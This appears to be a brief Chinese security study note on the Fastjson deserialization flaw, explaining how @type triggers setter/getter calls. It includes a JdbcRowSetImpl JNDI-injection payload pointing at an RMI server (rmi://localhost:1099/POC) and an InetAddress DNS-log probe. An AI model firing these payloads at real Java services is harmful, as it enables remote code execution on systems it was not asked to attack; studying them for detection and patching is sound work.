Ref：https://zhuanlan.zhihu.com/p/99075925

## Fastjson反序列化漏洞

### 原理

反序列化 @type 指定的类时，指定类的 setter 或 getter 被调用导致的命令执行。

漏洞触发和 `setter` 与 `getter` 有关，那么利用就是找那些在 `setter` 和 `getter` 中有敏感方法的类。

### 利用

JNDI 注入：Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），轻型目录访问协议（LDAP）或域名服务（DNS）。

`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/POC", "autoCommit":true}`

原理是 `com.sun.rowset.JdbcRowSetImpl` 这个类在设置 `autoCommit` 的 setter 时会调用 connect 方法去连接 `dataSourceName` 指定的 jdbc 服务。 JNDI 常用的有 RMI 和 LDAP 服务。

DNS log：

```text
{"@type":"java.net.InetAddress","val":"example.com"}
```

原理是 `java.net.InetAddress` 这个类在实例化时会尝试做对 `example.com` 做域名解析，这时候可以通过 dns log 的方式得知漏洞是否存在了。